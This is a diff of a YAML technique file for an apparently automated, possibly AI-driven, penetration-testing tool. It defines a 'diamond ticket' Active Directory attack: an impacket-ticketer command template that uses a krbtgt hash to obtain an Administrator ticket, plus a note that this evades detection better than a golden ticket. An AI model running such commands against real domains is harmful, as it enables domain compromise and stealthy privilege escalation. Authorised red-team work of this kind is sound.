@@ -2,15 +2,19 @@ name: diamond_ticket
 category: ad
 description: Diamond ticket — modify legitimate TGT
 preconditions:
-  - domain_joined
+- domain_joined
 parameters:
   target_ip: from_engagement.target_ip
-command_template: "impacket-ticketer -request -domain {domain} -user Administrator -password '{password}' -nthash '{krbtgt_hash}' -domain-sid '{sid}'"
+command_template: impacket-ticketer -request -domain {domain} -user Administrator
+  -password '{password}' -nthash '{krbtgt_hash}' -domain-sid '{sid}'
 parser: null
 expected_effects:
-  - action_completed
+- action_completed
 falsifier:
-  pattern: "error|failed|refused|denied"
+  pattern: error|failed|refused|denied
   timeout: 30
 model_tier: haiku
-mechanism: "Modifies legitimate TGT's PAC instead of forging from scratch. Harder to detect than golden ticket because the TGT has valid timestamp and encryption from DC."
+mechanism: Modifies legitimate TGT's PAC instead of forging from scratch. Harder to
+  detect than golden ticket because the TGT has valid timestamp and encryption from
+  DC.
+hacktricks_ref: windows-hardening/active-directory-methodology/README.md
